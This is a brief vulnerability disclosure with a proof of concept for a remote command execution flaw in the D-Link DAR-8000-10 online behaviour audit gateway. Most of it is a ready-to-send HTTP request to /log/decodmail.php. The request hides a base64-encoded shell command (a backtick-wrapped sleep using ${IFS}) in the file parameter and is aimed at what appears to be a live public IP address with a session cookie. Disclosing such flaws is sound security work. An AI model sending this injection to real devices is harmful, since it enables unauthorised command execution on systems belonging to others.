The D-LINK-DAR-8000-10 Online behavior audit gateway has rce vulnerabilities

official website:http://www.dlink.com.cn/

version:D-LINK  DAR-8000-10

See the login page.

![WPS图片(1)](https://github.com/TinkAnet/cve/assets/118334129/8a348409-d318-414f-9e80-a0cf25c01d13)

Construct the file parameter /etc/' sleep${IFS}10 '.pcap, and then use base64 encryption to construct the file parameter, and successfully execute the system command

POC
```
GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1
Host: 59.60.19.174:8443
Cookie: PHPSESSID=25b739a8fcf3db5555845ffce2251be5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
![WPS图片(2)](https://github.com/TinkAnet/cve/assets/118334129/cbb9dc67-e3b9-4fe1-bbef-7dbcfada98d9)

